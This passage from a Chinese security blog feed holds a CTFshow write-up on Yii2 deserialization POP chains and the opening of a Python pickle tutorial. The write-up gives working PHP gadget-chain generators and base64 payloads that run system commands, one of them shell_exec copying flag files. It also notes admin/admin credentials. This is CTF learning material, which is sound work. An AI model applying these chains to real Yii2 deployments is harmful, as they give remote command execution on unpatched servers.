property\">formatters</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'close'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">IndexAction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">Faker<span class=\"token punctuation\">\\</span>Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BatchQueryResult</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$_dataReader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Generator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>BatchQueryResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">BatchQueryResult</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo3OiJwaHBpbmZvIjtzOjI6ImlkIjtzOjE6IjEiO31pOjE7czozOiJydW4iO319fX0=</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100053418.png\" alt=\"image-20230310005338299\" /></p>\n<p>成功执行 phpinfo，执行一个 ping <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20=\">www.baidu.com</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100055463.png\" alt=\"image-20230310005515376\" /></p>\n<h3 id=\"其他pop链\"><a class=\"anchor\" href=\"#其他pop链\">#</a> 其他 pop 链</h3>\n<p>看到师傅利用别的函数也有 pop 链，学习记录一下</p>\n<p>链子的起点还是 <code>basic/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>  这个文件下的__destruct 函数，这个 pop 中没有再啊利用 call 魔术方法，而是找到了一个本来就有的 close 函数来实现命令执行，找到的利用函数在 <code>basic/vendor/yiisoft/yii2/web/DbSession.php</code>  这里</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111573.png\" alt=\"image-20230310011115526\" /></p>\n<p>这个函数下面的 composeFields 可以利用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111531.png\" alt=\"image-20230310011105476\" /></p>\n<p>call_user_func 这个函数中的参数也是可控的</p>\n<p>pop:</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>yii<span class=\"token operator\">\\</span>db<span class=\"token operator\">\\</span>BatchQueryResult<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span>__destruct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>reset<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>↓↓↓</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>yii<span class=\"token operator\">\\</span>web<span class=\"token operator\">\\</span>DbSession<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>composeFields<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>call_user_func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>↓↓↓</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>yii<span class=\"token operator\">\\</span>rest<span class=\"token operator\">\\</span>IndexAction<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>call_user_func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexAction</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ping www.baidu.com\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>web</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>IndexAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">DbSession</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$writeCallback</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">writeCallback</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">IndexAction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>web<span class=\"token punctuation\">\\</span>DbSession</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BatchQueryResult</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$_dataReader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DbSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>BatchQueryResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">BatchQueryResult</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6MTg6InBpbmcgd3d3LmJhaWR1LmNvbSI7fWk6MTtzOjM6InJ1biI7fX19</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100126159.png\" alt=\"image-20230310012647055\" /></p>\n<p>也是测试成功</p>\n<h2 id=\"web267\"><a class=\"anchor\" href=\"#web267\">#</a> web267</h2>\n<p>这里存在弱口令，admin、admin</p>\n<p>登录后在 about 的源码中有提示</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100959022.png\" alt=\"image-20230310095940986\" /></p>\n<p>get 传入 view-source</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101000342.png\" alt=\"image-20230310100033303\" /></p>\n<p>这里找到了反序列化的入口，用上面的 poc 直接打就行（这里入口 r=backdoor/shell）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101003194.png\" alt=\"image-20230310100348135\" /></p>\n<h2 id=\"web268-270\"><a class=\"anchor\" href=\"#web268-270\">#</a> web268-270</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Action</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexAction</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>web</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MultiFieldSession</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$writeCallback</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">DbSession</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">MultiFieldSession</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">writeCallback</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>IndexAction</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"run\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>base<span class=\"token punctuation\">\\</span>BaseObject</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BatchQueryResult</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$_dataReader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>web<span class=\"token punctuation\">\\</span>DbSession</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token variable\">$exp</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>BatchQueryResult</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell_exec'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cp /f* 1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 此处写命令</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$exp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>换一个链子就行</p>\n",
            "tags": [
                "CTFshow",
                "yii反序列化"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "python的序列化和反序列化",
            "date_published": "2023-03-07T16:00:00.000Z",
            "content_html": "<h2 id=\"python的序列化和反序列化\"><a href=\"#python的序列化和反序列化\" class=\"headerlink\" title=\"python的序列化和反序列化\"></a>python的序列化和反序列化</h2><p>​\t程序运行的过程中，所有对象都是在内存中操作的，当程序一旦执行完毕，对象占有的内存会被收回，如果我们想重复调用这些对象就需要将这些对象持久化储存到内存中，下次运行的时候直接读取相关数据，我们将对象从内存中变成可以持久化储存的数据的过程称为序列化</p>\n<h3 id=\"可序列化的对象\"><a href=\"#可序列化的对象\" class=\"headerlink\" title=\"可序列化的对象\"></a>可序列化的对象</h3><ul>\n<li>整数、浮点数、复数</li>\n<li>str、byte、bytearray</li>\n<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>\n<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>\n<li>定义在模块最外层的内置函数</li>\n<li>定义在模块最外层的类</li>\n<li>None、True和False</li>\n</ul>\n<h2 id=\"pickle库和函数\"><a href=\"#pickle库和函数\" class=\"headerlink\" title=\"pickle库和函数\"></a>pickle库和函数</h2><p>pickle是python语言的一个标准模块，实现了基本数据的序列化和反序列化<br>dumps\t将对象反序列化为bytes对象<br>dump\t将对象反序列化到文件对象，存入文件</p>\n<p>loads\t对bytes对象进行反序列化<br>load\t通过对象反序列化，从文件中读取数据</p>\n<p>首先通过几个例子来看一下几个函数的作用</p>\n<p>dump&#x2F;load</p>\n<pre><code class=\"bash\">#序列化\npickle.dump(obj, file, protocol=None,)\nobj表示要进行封装的对象(必填参数）\nfile表示obj要写入的文件对象\n以二进制可写模式打开即wb(必填参数）\n#反序列化\npickle.load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;, buffers=None)\nfile文件中读取封存后的对象\n以二进制可读模式打开即rb(必填参数)\n</code></pre>\n<pre><code class=\"python\">import pickle\nimport pickletools\nimport os\n\nclass test(object):\n    def __init__(self):\n        self.value1=&#39;abc1&#39;\n        self.value2=&#39;abc2&#39;\n\nx=test()\nfile=open(&#39;1.txt&#39;,&#39;wb&#39;)\ny=pickle.dump(x,file)\nprint(file)\nfile.close()\nfile1=open(&#39;1.txt&#39;,&#39;rb&#39;)\nz=pickle.load(file1)\nprint(z)\n</code></pre>\n<pre><code class=\"bash\">#序列化\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。\n#反序列化\npickle.loads(bytes_object, *,fix_imports=True, encoding=&quot;ASCII&quot;. errors=&quot;strict&quot;)\nloads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。\n</code></pre>\n<pre><code class=\"python\">import pickle\nimport pickletools\nimport os\n\nclass test(object):\n    def __init__(self):\n        self.value1=&#39;a&#39;\n        self.value2=&#39;b&#39;\n\nx=test()\ny=pickle.dumps(x)\nprint(y)\nz=pickle.loads(y)\nprint(z)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820152155604.png\" alt=\"image-20220820152155604\"></p>\n<p>从上面两个例子可以知道python怎么实现序列化和反序列的操作，接下来记录序列化后的字符串是的含义</p>\n<h2 id=\"PVM\"><a href=\"#PVM\" class=\"headerlink\" title=\"PVM\"></a>PVM</h2><p>Python是一个名为解释器的软件包，解释器是可以让程序运行起来的一套程序，具有独立性，当我们运行一个python程序的时候会执行两个步骤</p>\n<ol>\n<li>先将将源码编译成字节码（字节码是python特有的一种表现形式，需要进一步编译才能被机器执行，如果python进程在主机上面有写入权限，那么它会吧程序字节码保存为一个.pyc为扩展名的文件，如果没用则在内存中生成字节码在程序执行结束后被自动抛弃）</li>\n<li>python程序将编译好的字节码转发到PVM（python虚拟机）中，PVM会循环迭代执行字节码码指令</li>\n</ol>\n<p>(<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0cxMDExL2FydGljbGUvZGV0YWlscy8xMDI5MDg4ODY=\">https://blog.csdn.net/G1011/article/details/102908886</span>)</p>\n<h2 id=\"PVM和Pickle的关系\"><a href=\"#PVM和Pickle的关系\" class=\"headerlink\" title=\"PVM和Pickle的关系\"></a>PVM和Pickle的关系</h2><p>pickle是一门基于栈的编程语言，有不同的编程方式，其本质就是一个轻量级的PVM</p>\n<p>这个轻量级的PVM由三部分组成及功能：</p>\n<p>指令处理器：</p>\n<pre><code>从数据流中读取操作码和参数，并对其进行解释处理，之时处理器会循环这个过程，不断改变栈区（stack）和标签区（memo）区域的值，知道遇到.结束。这时最终停留在栈顶的值将会被作为反序列化对象返回\n</code></pre>\n<p>栈区（stack）：</p>\n<pre><code>由python的列表（list）实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果\n</code></pre>\n<p>标签区（memo）：</p>\n<pre><code>由python的字典（dict）实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供储存功能\n</code></pre>\n<h3 id=\"python2\"><a href=\"#python2\" class=\"headerlink\" title=\"python2\"></a>python2</h3><p>几个比较重要的操作码：</p>\n<pre><code>c: 读取本行的内容作为模块名（module）, 读取下一行的内容作为对象名object，然后将 module.object作为可调用对象压入到栈中\n(: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组\nS: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中\nt: 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中\nR: 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中\n.: 结束整个 